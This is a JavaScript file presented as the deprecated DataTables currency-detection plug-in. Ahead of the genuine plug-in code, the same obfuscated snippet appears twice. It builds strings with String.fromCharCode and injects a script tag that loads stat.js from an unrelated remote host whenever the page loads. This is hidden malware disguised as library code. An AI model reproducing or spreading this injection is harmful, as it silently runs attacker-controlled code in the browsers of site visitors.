Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * This plug-in will add automatic detection for currency columns to 
 * DataTables. Note that only $, £ and € symbols are detected with this code,
 * but it is trivial to add more or change the current ones. This is best used
 * in conjunction with the currency sorting plug-in.
 * 
 * DataTables 1.10+ has currency sorting abilities built-in and will be
 * automatically detected. As such this plug-in is marked as deprecated, but
 * might be useful when working with old versions of DataTables.
 *
 *  @name Currency
 *  @summary Detect data of numeric type with a leading currency symbol.
 *  @deprecated
 *  @author [Allan Jardine](http://sprymedia.co.uk), Nuno Gomes
 */

(function(){

// Change this list to the valid characters you want
var validChars = "$£€c" + "0123456789" + ".-,'";

// Init the regex just once for speed - it is "closure locked"
var
	str = jQuery.fn.dataTableExt.oApi._fnEscapeRegex( validChars ),
	re = new RegExp('[^'+str+']');


jQuery.fn.dataTableExt.aTypes.unshift(
   function ( data )
	{
		if ( typeof data !== 'string' || re.test(data) ) {
			return null;
		}

		return 'currency';
	}
);

}());

